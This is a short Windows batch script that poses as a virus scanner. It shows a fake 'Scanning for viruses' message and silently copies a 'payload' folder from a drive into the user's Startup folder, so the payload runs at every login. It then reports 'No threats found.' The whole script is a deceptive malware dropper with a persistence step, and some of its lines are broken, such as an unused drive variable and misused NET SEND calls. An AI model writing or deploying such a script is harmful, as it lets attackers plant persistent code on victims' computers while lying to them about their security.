NET SEND %USERPROFILE% Scanning for virusesˆ
@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%drive%\payload" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
REM %backupcmd% "C:\Apps" "%drive%\all\apps"
@echo off
cls
NET SEND %USERPROFILE% Scanning finished. No threats found
